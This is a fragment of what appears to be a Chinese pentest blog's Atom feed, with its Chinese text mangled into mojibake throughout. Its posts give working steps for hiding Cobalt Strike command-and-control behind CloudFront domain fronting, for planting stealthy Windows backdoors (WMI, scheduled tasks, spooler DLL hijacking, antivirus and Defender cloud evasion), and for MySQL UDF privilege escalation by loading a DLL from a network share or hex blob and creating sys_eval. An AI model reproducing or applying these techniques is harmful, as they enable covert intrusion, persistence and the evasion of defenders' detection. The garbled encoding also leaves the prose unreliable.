class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è®¾ç½®https"><a href="#è®¾ç½®https" class="headerlink" title="è®¾ç½®https"></a>è®¾ç½®https</h4><p>è¿è¡Œè„šæœ¬<code>HTTPsC2DoneRight.sh</code>ç”Ÿæˆå¯¹åº”éœ€è¦çš„æ–‡ä»¶ï¼Œæ¯”å¦‚<code>letsencrypt</code>ã€<code>amazon.profile</code>ç­‰æ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™httpsä¼šè‡ªåŠ¨è®¾ç½®æˆåŠŸï¼Œæµ‹è¯•å¦‚ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;example.comcurl https:&#x2F;&#x2F;example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™æ—¶å€™ä¼šç”Ÿæˆhttpsé€šä¿¡éœ€è¦çš„è¯ä¹¦æ–‡ä»¶ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡è‡ªç­¾åLetsencryptç”³è¯·ä¸‹æ¥çš„ï¼š</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;letsencrypt-auto certonly --standalone -d åŸŸå --email é‚®ç®±ï¼ˆå¯åŒ¿åï¼‰openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem -out pkcs.p12 -name åŸŸå -passout pass:ABcd123456keytool -importkeystore -deststorepass ABcd123456 -destkeypass ABcd123456 -destkeystore keystore.store -srckeystore pkcs.p12 -srcstoretype PKCS12 -srcstorepass ABcd123456 -alias åŸŸå<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆçš„keystoreæ˜¯åé¢è®¾ç½®CSé…ç½®æ–‡ä»¶çš„æ—¶å€™ä½¿ç”¨ã€‚</p><h4 id="è®¾ç½®CloudFront"><a href="#è®¾ç½®CloudFront" class="headerlink" title="è®¾ç½®CloudFront"></a>è®¾ç½®CloudFront</h4><p>æ ‡çº¢çš„ç‚¹ç‰¹åˆ«æ³¨æ„ï¼Œè¦æ”¹æˆè¿™ä¸ªæ ·å­ï¼Œå¦åˆ™æµ‹è¯•å¤±è´¥ã€‚æ›´æ”¹ä¹‹åå‘å¸ƒï¼Œæµ‹è¯•æ­¤æ—¶çš„<code>CloudFront</code>æ˜¯å¦ç”Ÿæ•ˆ:</p><pre class="line-numbers language-none"><code class="language-none">curl https:&#x2F;&#x2F;&lt;example&gt;.cloudfront.netcurl http:&#x2F;&#x2F;&lt;example&gt;.cloudfront.net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/08/28/CloudFront-Https/WX20200828-01.png"></p><h4 id="è®¾ç½®Profile"><a href="#è®¾ç½®Profile" class="headerlink" title="è®¾ç½®Profile"></a>è®¾ç½®Profile</h4><p>ç”ŸæˆProfileï¼Œä¸Šé¢ç”Ÿæˆçš„<code>amazon.profile</code>æµ‹è¯•ä¸Šçº¿å¤±è´¥ã€‚</p><pre class="line-numbers language-none"><code class="language-none">cd &amp;&amp; git clone https:&#x2F;&#x2F;github.com&#x2F;bluscreenofjeff&#x2F;Malleable-C2-Randomizer &amp;&amp; cd Malleable-C2-Randomizerpython malleable-c2-randomizer.py -profile Sample\ Templates&#x2F;Pandora.profile -notestcp pandora_&lt;random&gt;.profile &#x2F;root&#x2F;cobaltstrike&#x2F;httpsProfile&#x2F; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="ä¿®æ”¹profile"><a href="#ä¿®æ”¹profile" class="headerlink" title="ä¿®æ”¹profile"></a>ä¿®æ”¹profile</h4><ol><li>æŠŠamazon.profileçš„æœ€åå››è¡Œè®¾ç½®httpsçš„æ·»åŠ åˆ°pandora_<random>.profileé‡Œé¢ã€‚</random></li><li>ä¿®æ”¹<code>pandora_&lt;random.profile</code>é‡Œé¢çš„<code>Host</code>ï¼Œæ”¹ä¸ºawsç”³è¯·ä¸‹æ¥çš„åŠ é€ŸåŸŸåã€‚</li><li>åœ¨profileæ–‡ä»¶æœ€åæ–°å¢é…ç½®ï¼š</li></ol><pre class="line-numbers language-none"><code class="language-none">https-certificate &#123;set keystore &quot;keystore.store&quot;;set password &quot;1234565&quot;;&#125;http-config &#123;set trust_x_forwarded_for &quot;true&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è®¾ç½®CS"><a href="#è®¾ç½®CS" class="headerlink" title="è®¾ç½®CS"></a>è®¾ç½®CS</h4><pre class="line-numbers language-none"><code class="language-none">systemctl stop httpd  &#x2F;&#x2F;å…³é—­apache.&#x2F;teamserver &lt;IP&gt; &lt;Pass&gt; &lt;path to pandora profile&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ–°å»ºä¸€ä¸ªlistener:</p><p><img src="/2020/08/28/CloudFront-Https/WX20200828-02.png"></p><p>æŸ¥çœ‹CSçš„<code>WEBlog</code>:</p><pre class="line-numbers language-none"><code class="language-none">curl https:&#x2F;&#x2F;cloudfront.net&#x2F;Hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨weblogé‡Œé¢æŸ¥çœ‹åˆ°å¯¹åº”çš„è¯·æ±‚å³è®¾ç½®æˆåŠŸã€‚</p><p><img src="/2020/08/28/CloudFront-Https/WX20200828-03.png"></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.blackhillsinfosec.com/using-cloudfront-to-relay-cobalt-strike-traffic/">https://www.blackhillsinfosec.com/using-cloudfront-to-relay-cobalt-strike-traffic/</a></li><li><a href="https://www.cnblogs.com/donot/p/13921874.html">Domain Frontedä»ç„¶æ˜¯æœ€ä½³çš„C2éšè—æ‰‹æ®µ</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;è®°å½•ä¸€ä¸‹å½“ä½¿ç”¨&lt;code&gt;Domain Fronting&lt;/code&gt;ä¸­ä½¿ç”¨&lt;code&gt;https&lt;/code&gt;æ¥ä¸Šçº¿æ—¶å€™çš„å‘ï¼Œå› ä¸ºæŸ¥äº†åŠåœˆæ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼çš„èµ„æ–™ï¼Œä¸ºå•¥éè¦httpså‘¢ï¼Œå› ä¸º&lt;code&gt;node32&lt;/code&gt;å¯¹httpçš„æµé‡å¾ˆæ•æ„Ÿã€‚&lt;/p&gt;
&lt;p&gt;###ç›®æ ‡&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨&lt;code&gt;Windows/beacon_https/reverse_https&lt;/code&gt;ä½œä¸ºä¸Šçº¿çš„payload&lt;/li&gt;
&lt;li&gt;AWSçš„&lt;code&gt;Cloudfront&lt;/code&gt;ä½œä¸ºå‰ç½®åŸŸå&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;å‡†å¤‡å·¥ä½œ&quot;&gt;&lt;a href=&quot;#å‡†å¤‡å·¥ä½œ&quot; class=&quot;headerlink&quot; title=&quot;å‡†å¤‡å·¥ä½œ&quot;&gt;&lt;/a&gt;å‡†å¤‡å·¥ä½œ&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;åŸŸå: example.com
VPS(Centos)
cloudflare(åªä½œåŸŸåè§£æ,ä¸æ·»åŠ ä»»ä½•å…¶ä»–åŠŸèƒ½ï¼Œä¸åŠ CDNï¼Œä¸åŠ HTTPS)&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;h2 id=&quot;éƒ¨ç½²å·¥ä½œ&quot;&gt;&lt;a href=&quot;#éƒ¨ç½²å·¥ä½œ&quot; class=&quot;headerlink&quot; title=&quot;éƒ¨ç½²å·¥ä½œ&quot;&gt;&lt;/a&gt;éƒ¨ç½²å·¥ä½œ&lt;/h2&gt;&lt;p&gt;å®‰è£…çš„apacheæ˜¯æµ‹è¯•è¿é€šæ€§ï¼Œé™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä»»ä½•ç”¨å¤„ã€‚&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;yum install httpd
systemctl start httpd&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;å¢åŠ apacheé…ç½®æ–‡ä»¶&quot;&gt;&lt;a href=&quot;#å¢åŠ apacheé…ç½®æ–‡ä»¶&quot; class=&quot;headerlink&quot; title=&quot;å¢åŠ apacheé…ç½®æ–‡ä»¶&quot;&gt;&lt;/a&gt;å¢åŠ apacheé…ç½®æ–‡ä»¶&lt;/h4&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;#&amp;#x2F;etc&amp;#x2F;httpd&amp;#x2F;conf.d&amp;#x2F;vhost.conf
&amp;lt;VirtualHost *:80&amp;gt;
   DocumentRoot &amp;#x2F;var&amp;#x2F;www&amp;#x2F;html
   ServerName example.com


RewriteEngine on
RewriteCond %&amp;#123;SERVER_NAME&amp;#125; &amp;#x3D;example.com
RewriteRule ^ https:&amp;#x2F;&amp;#x2F;%&amp;#123;SERVER_NAME&amp;#125;%&amp;#123;REQUEST_URI&amp;#125; [END,NE,R&amp;#x3D;permanent]
&amp;lt;&amp;#x2F;VirtualHost&amp;gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Windowsåé—¨éšè—</title>
    <link href="https://jkme.github.io/2020/08/28/hide-your-windows-backdoor.html"/>
    <id>https://jkme.github.io/2020/08/28/hide-your-windows-backdoor.html</id>
    <published>2020-08-27T16:00:00.000Z</published>
    <updated>2022-01-21T02:26:43.177Z</updated>
    
    <content type="html"><![CDATA[<h3 id="åé—¨çš„æ„æˆ"><a href="#åé—¨çš„æ„æˆ" class="headerlink" title="åé—¨çš„æ„æˆ"></a>åé—¨çš„æ„æˆ</h3><p>åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:</p><ol><li>shellcodeçš„åˆ†ç¦»å…æ€</li><li>C2æœåŠ¡å™¨çš„éšè—</li><li>Windowsåé—¨çš„è®¾ç½®</li></ol><h3 id="åˆ†ç¦»å…æ€"><a href="#åˆ†ç¦»å…æ€" class="headerlink" title="åˆ†ç¦»å…æ€"></a>åˆ†ç¦»å…æ€</h3><p>shellcodeçš„åˆ†ç¦»å…æ€æœ‰å¾ˆå¤šç§ï¼Œè¿™é‡ŒæŠŠæ¯ä¸ªæ¨¡å—æ‹¿å‡ºæ¥å°±æ˜¯å¦‚ä¸‹çš„å‡ ä¸ª:</p><ol><li>é€šä¿¡: <code>socket</code>,<code>http</code></li><li><code>shellcode</code>çš„æ‰§è¡Œæ–¹å¼</li><li><code>shellcode</code>çš„æµé‡</li><li>è¿œç¨‹æœåŠ¡å™¨çš„éšè—</li></ol><p>é™¤å»ç¬¬äºŒç§æ–¹å¼æœ‰å¾ˆå¤šç§å¯ä»¥æ‰§è¡Œshellcodeçš„ï¼Œå…¶ä»–ä¸‰ç§æœ€å¥½çš„è§£å†³æ–¹æ¡ˆæ˜¯å®ç”¨<code>Domain Fronting</code>éšè—æœåŠ¡å™¨ï¼ŒAESåŠ¨æ€åŠ å¯†è§£å¯†è¿è¡Œshellcodeã€‚è¿™æ ·å­æ—¢éšè—äº†æœåŠ¡å™¨ï¼Œåˆé¿å…shellcodeçš„æ˜æ–‡æµé‡è¢«æ¢æµ‹åˆ°ã€‚å½“ç„¶ä¸Šçº¿ä¹‹åçš„æ“ä½œè¢«æ¢æµ‹ä¸åœ¨è¢«è®¨è®ºçš„èŒƒå›´ä¹‹å†…ã€‚</p><p>åœ¨å‚è€ƒèµ„æ–™é‡Œé¢,<code>uknownsec</code>å·²ç»æŠŠä¸»è¦çš„ä»£ç æ”¾å‡ºæ¥äº†ã€‚åªéœ€è¦æ‹¿å‡ºæ¥æ‹¼å‡‘ä¸€ä¸‹å°±å¯ä»¥é£Ÿç”¨ã€‚</p><p>å…¶ä¸­æœåŠ¡ç«¯å‡ºå»pythonçš„åŠŸèƒ½ä¹‹å¤–ï¼Œå¯ä»¥ç»™è‡ªå·±åŠ ä¸Šä¸€ä¸ª<code>slack</code>æœºå™¨äººçš„é€šçŸ¥ï¼Œè¿™æ ·å­ä¸Šçº¿çš„æ—¶å€™å°±æœ‰é€šçŸ¥ã€‚</p><h4 id="C2æœåŠ¡å™¨çš„éšè—"><a href="#C2æœåŠ¡å™¨çš„éšè—" class="headerlink" title="C2æœåŠ¡å™¨çš„éšè—"></a>C2æœåŠ¡å™¨çš„éšè—</h4><p>è§ä¸Šä¸€ç¯‡çš„<code>Domain Fronting</code>éšè—HTTPSã€‚</p><p>è¿™ä¸ªC2çš„éšè—å¦‚æœæ›´å®Œç¾ä¸€ç‚¹çš„è¯ï¼Œå¯ä»¥åŠ ä¸Šredirectorã€‚ä½†æ˜¯æˆ‘æƒ³äº†ä¸€ä¸‹ï¼Œå¼€å¯CSçš„æ—¶é—´å°±æ˜¯æ§åˆ¶åˆ©ç”¨çš„é‚£ä¸€å°æ®µï¼Œè¿™é‡Œå°±ä¸æŠ˜è…¾äº†ã€‚</p><h4 id="Windowsåé—¨çš„è®¾ç½®"><a href="#Windowsåé—¨çš„è®¾ç½®" class="headerlink" title="Windowsåé—¨çš„è®¾ç½®"></a>Windowsåé—¨çš„è®¾ç½®</h4><p>é™¤å»æœ€å¸¸è§çš„è®¡åˆ’ä»»åŠ¡ï¼Œå‰©ä¸‹çš„æ˜¯ä¸€å †æ³¨å†Œè¡¨ï¼Œå¦‚æœå­˜åœ¨360ä¹‹ç±»çš„è¯ï¼Œæ˜¯æ¯”è¾ƒéš¾å¤„ç†çš„ã€‚å…¶ä¸­æœ‰ä¸€ä¸ª<code>WMI</code>ï¼Œå¾ˆå¥‡æ€ªå„ä¸ªæ€è½¯çš„æ‹¦æˆªéƒ½ä¸æ˜¯å¤ªç§¯æã€‚</p><p>åœ¨å®é™…æµ‹è¯•ä¸­ï¼Œå¦‚æœç•™çš„åé—¨æ˜¯æœåŠ¡å™¨ï¼Œé‚£ä¹ˆåé—¨å¿…é¡»æ˜¯å®šæ—¶å¯åŠ¨ï¼Œå¦‚æœæ˜¯ä¸ªäººç”µè„‘ï¼Œé‚£ä¹ˆæ˜¯åœ¨ç‰¹å®šçš„æ—¶é—´å†…å¯åŠ¨ã€‚æ³¨æ„è¿™ä¸ªæ—¶é—´ç‚¹çš„è®¾ç½®ã€‚</p><p>åœ¨Windowsä¸Šé¢ï¼Œæœ€åç•™ä¸‹2ä¸ªä»¥ä¸Šçš„åé—¨ã€‚ä¸€ä¸ªexeï¼Œä¸€ä¸ªdllåŠ«æŒï¼ŒdllåŠ«æŒæˆ‘åœ¨githubä¸Šé¢æ”¾äº†ä¸¤ä¸ªæ–¹å¼ï¼Œæ¨èä½¿ç”¨spoolerï¼Œå› ä¸ºå®ƒé»˜è®¤æƒé™æœ€é«˜ï¼Œæ¯ä¸ªç”µè„‘éƒ½æ˜¯å¼€æœºå¯åŠ¨ã€‚</p><h3 id="åé—¨çš„å½¢å¼"><a href="#åé—¨çš„å½¢å¼" class="headerlink" title="åé—¨çš„å½¢å¼"></a>åé—¨çš„å½¢å¼</h3><h4 id="Windowsçš„Systemæƒé™"><a href="#Windowsçš„Systemæƒé™" class="headerlink" title="Windowsçš„Systemæƒé™"></a>Windowsçš„Systemæƒé™</h4><ul><li>wmiå¼€æœºå¯åŠ¨å’Œå®šæ—¶å¯åŠ¨</li><li>è®¡åˆ’ä»»åŠ¡</li><li>spoolerçš„DllåŠ«æŒ</li></ul><h4 id="Windowsçš„Useræƒé™"><a href="#Windowsçš„Useræƒé™" class="headerlink" title="Windowsçš„Useræƒé™"></a>Windowsçš„Useræƒé™</h4><ul><li>msdtcçš„dllåŠ«æŒ</li></ul><h4 id="Windowsçš„Networkæƒé™"><a href="#Windowsçš„Networkæƒé™" class="headerlink" title="Windowsçš„Networkæƒé™"></a>Windowsçš„Networkæƒé™</h4><ul><li>Redisçš„DllåŠ«æŒ</li></ul><h4 id="äº‘æŸ¥æ€çš„ç»•è¿‡"><a href="#äº‘æŸ¥æ€çš„ç»•è¿‡" class="headerlink" title="äº‘æŸ¥æ€çš„ç»•è¿‡"></a>äº‘æŸ¥æ€çš„ç»•è¿‡</h4><p>ä¹‹å‰åœ¨æµ‹è¯•<code>Windows Defender</code>çš„æ—¶å€™ï¼Œæœ¬æ¥æ˜¯å…æ€çš„exeï¼Œè·‘ä¸¤ä¸‰æ¬¡ä¹‹åå°±è¢«æ€äº†ã€‚ç™¾æ€ä¸å¾—å…¶è§£ï¼Œåæ¥å‘ç°æ˜¯äº‘ä¸Šä¼ ä¹‹åè¢«æŸ¥æ€äº†ï¼Œè§‚å¯Ÿä¸€ä¸‹ä¸Šçº¿äº‘æŸ¥æ€çš„æœºå™¨ï¼Œå¯ä»¥å¾ˆå®¹æ˜“çš„ç»•è¿‡ã€‚</p><p>å†å¾€åä¸€ç‚¹ï¼Œè€ƒè™‘ä¸€ä¸‹å¦‚æœæ¯ä¸ªæœºå™¨ä¸Šçº¿éƒ½æ˜¯ä½ åŠ¨æ‰‹æ¥åšçš„è¯ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘å†™ä¸€ä¸ªç¨‹åºï¼Œä¸ºæ¯ä¸€ä¸ªè¢«æ”¾åé—¨çš„ç”µè„‘ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„hashå€¼ï¼Œè¿™ä¸ªhashå€¼å­˜æ”¾åœ¨shellcodeåŠ è½½æœåŠ¡å™¨ä¸Šé¢ï¼Œshellcodeæ‰§è¡Œä¹‹å‰å…ˆæ£€æŸ¥æ˜¯å¦åœ¨æ•°æ®åº“é‡Œé¢ï¼Œè¿™æ ·æ˜¯ä¸æ˜¯æ›´å®Œç¾çš„æ–¹å¼?</p><h3 id="åé—¨çš„è¿›é˜¶"><a href="#åé—¨çš„è¿›é˜¶" class="headerlink" title="åé—¨çš„è¿›é˜¶"></a>åé—¨çš„è¿›é˜¶</h3><ul><li><code>AES</code>åŠ¨æ€åŠ è§£å¯†</li><li><code>Domain Fronting</code>éšè—å­˜æ”¾<code>shellcode</code> </li><li><code>Domain Fronting</code>éšè—<code>C2</code> </li><li><code>shellcode</code>å…æ€çš„æ‰§è¡Œæ–¹å¼</li></ul><p>å‚è€ƒèµ„æ–™:</p><ul><li><a href="https://uknowsec.cn/posts/notes/ShellCode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">https://uknowsec.cn/posts/notes/ShellCode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;åé—¨çš„æ„æˆ&quot;&gt;&lt;a href=&quot;#åé—¨çš„æ„æˆ&quot; class=&quot;headerlink&quot; title=&quot;åé—¨çš„æ„æˆ&quot;&gt;&lt;/a&gt;åé—¨çš„æ„æˆ&lt;/h3&gt;&lt;p&gt;åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;shellcodeçš„åˆ†ç¦»å…æ€&lt;/li&gt;
&lt;li&gt;C2æœåŠ¡å™¨çš„éšè—&lt;/li&gt;
&lt;li&gt;Windowsåé—¨çš„è®¾ç½®&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;åˆ†ç¦»å…æ€&quot;&gt;&lt;a href=&quot;#åˆ†ç¦»å…æ€&quot; class=&quot;headerlink&quot; title=&quot;åˆ†ç¦»å…æ€&quot;&gt;&lt;/a&gt;åˆ†ç¦»å…æ€&lt;/h3&gt;&lt;p&gt;shellcodeçš„åˆ†ç¦»å…æ€æœ‰å¾ˆå¤šç§ï¼Œè¿™é‡ŒæŠŠæ¯ä¸ªæ¨¡å—æ‹¿å‡ºæ¥å°±æ˜¯å¦‚ä¸‹çš„å‡ ä¸ª:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é€šä¿¡: &lt;code&gt;socket&lt;/code&gt;,&lt;code&gt;http&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shellcode&lt;/code&gt;çš„æ‰§è¡Œæ–¹å¼&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shellcode&lt;/code&gt;çš„æµé‡&lt;/li&gt;
&lt;li&gt;è¿œç¨‹æœåŠ¡å™¨çš„éšè—&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;é™¤å»ç¬¬äºŒç§æ–¹å¼æœ‰å¾ˆå¤šç§å¯ä»¥æ‰§è¡Œshellcodeçš„ï¼Œå…¶ä»–ä¸‰ç§æœ€å¥½çš„è§£å†³æ–¹æ¡ˆæ˜¯å®ç”¨&lt;code&gt;Domain Fronting&lt;/code&gt;éšè—æœåŠ¡å™¨ï¼ŒAESåŠ¨æ€åŠ å¯†è§£å¯†è¿è¡Œshellcodeã€‚è¿™æ ·å­æ—¢éšè—äº†æœåŠ¡å™¨ï¼Œåˆé¿å…shellcodeçš„æ˜æ–‡æµé‡è¢«æ¢æµ‹åˆ°ã€‚å½“ç„¶ä¸Šçº¿ä¹‹åçš„æ“ä½œè¢«æ¢æµ‹ä¸åœ¨è¢«è®¨è®ºçš„èŒƒå›´ä¹‹å†…ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å‚è€ƒèµ„æ–™é‡Œé¢,&lt;code&gt;uknownsec&lt;/code&gt;å·²ç»æŠŠä¸»è¦çš„ä»£ç æ”¾å‡ºæ¥äº†ã€‚åªéœ€è¦æ‹¿å‡ºæ¥æ‹¼å‡‘ä¸€ä¸‹å°±å¯ä»¥é£Ÿç”¨ã€‚&lt;/p&gt;
&lt;p&gt;å…¶ä¸­æœåŠ¡ç«¯å‡ºå»pythonçš„åŠŸèƒ½ä¹‹å¤–ï¼Œå¯ä»¥ç»™è‡ªå·±åŠ ä¸Šä¸€ä¸ª&lt;code&gt;slack&lt;/code&gt;æœºå™¨äººçš„é€šçŸ¥ï¼Œè¿™æ ·å­ä¸Šçº¿çš„æ—¶å€™å°±æœ‰é€šçŸ¥ã€‚&lt;/p&gt;
&lt;h4 id=&quot;C2æœåŠ¡å™¨çš„éšè—&quot;&gt;&lt;a href=&quot;#C2æœåŠ¡å™¨çš„éšè—&quot; class=&quot;headerlink&quot; title=&quot;C2æœåŠ¡å™¨çš„éšè—&quot;&gt;&lt;/a&gt;C2æœåŠ¡å™¨çš„éšè—&lt;/h4&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>MySql UDFææƒæ³¨æ„äº‹é¡¹</title>
    <link href="https://jkme.github.io/2020/07/29/mysql-UDF.html"/>
    <id>https://jkme.github.io/2020/07/29/mysql-UDF.html</id>
    <published>2020-07-28T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.931Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>[mysql-udf-exploitation]<a href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSFçš„dll: <a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p></blockquote><h3 id="0x01-å‡†å¤‡å·¥ä½œ"><a href="#0x01-å‡†å¤‡å·¥ä½œ" class="headerlink" title="0x01 å‡†å¤‡å·¥ä½œ"></a>0x01 å‡†å¤‡å·¥ä½œ</h3><p>å…ˆæ£€æŸ¥è¿è¡Œçš„mysqlç»“æ„:</p><pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç»“æœå¦‚ä¸‹:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>+----------------------+---------------------------+<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>+----------------------+---------------------------+<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>+----------------------+---------------------------+MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>+-------------------------+--------+<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>+-------------------------+--------+<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span><span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>+-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨<code>Mysql 5.0.67</code>ç‰ˆæœ¬å¼€å§‹ï¼ŒUDFçš„æ–‡ä»¶å¿…é¡»æ”¾åœ¨mysqlçš„æ’ä»¶ç›®å½•: <code>select @@plugin_dir;</code></p><p>å¯ä»¥åœ¨å¼€å¯mysqlçš„æ—¶å€™è®¾ç½®pluginçš„ç›®å½•:</p><pre class="line-numbers language-none"><code class="language-none">æŒ‡å®šç›®å½•:mysqld.exe â€“plugin-dir&#x3D;C:\\temp\\plugins\\æŒ‡å®šé…ç½®æ–‡ä»¶:mysqld.exe --defaults-file&#x3D;C:\\temp\\my.inié…ç½®æ–‡ä»¶åŒ…æ‹¬å¦‚ä¸‹å†…å®¹:[mysqld]plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€ç‰ˆæœ¬çš„Mysqlæœç´¢UDFè·¯å¾„æ˜¯æŒ‰ç…§å¦‚ä¸‹çš„é¡ºåºæ¥çš„:</p><ul><li>@@datadir</li><li>@@basedir\bin</li><li>C:\windows</li><li>C:\windows\system</li><li>C:\windows\system32</li></ul><h3 id="ä¸Šä¼ UDFçš„æ–‡ä»¶"><a href="#ä¸Šä¼ UDFçš„æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ UDFçš„æ–‡ä»¶"></a>ä¸Šä¼ UDFçš„æ–‡ä»¶</h3><h4 id="0x01-ç½‘ç»œå…±äº«å†™æ–‡ä»¶"><a href="#0x01-ç½‘ç»œå…±äº«å†™æ–‡ä»¶" class="headerlink" title="0x01 ç½‘ç»œå…±äº«å†™æ–‡ä»¶"></a>0x01 ç½‘ç»œå…±äº«å†™æ–‡ä»¶</h4><pre class="line-numbers language-none"><code class="language-none">select load_file(&#39;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#39;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="0x02-åå…­è¿›åˆ¶"><a href="#0x02-åå…­è¿›åˆ¶" class="headerlink" title="0x02 åå…­è¿›åˆ¶"></a>0x02 åå…­è¿›åˆ¶</h4><pre class="line-numbers language-none"><code class="language-none">xxd -plain &#x2F;tmp&#x2F;udf.dll | tr -d &#39;\n&#39; &gt; &#x2F;tmp&#x2F;dll.hex è½¬æ¢ä¸º16è¿›åˆ¶use mysql;set @a&#x3D;concat(&#39;&#39;, 0x&lt;hex_of_exe&gt;);create table tmp(data LONGBLOB);insert into tmp values(&quot;&quot;);update tmp set data &#x3D; @a;select data from tmp into DUMPFILE &lt;dir&gt;;create function sys_eval returns string soname &#39;sys_eval.dll&#39;;drop table tmp;drop function sys_eval; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x03-ç½‘ç»œå…±äº«-16è¿›åˆ¶"><a href="#0x03-ç½‘ç»œå…±äº«-16è¿›åˆ¶" class="headerlink" title="0x03 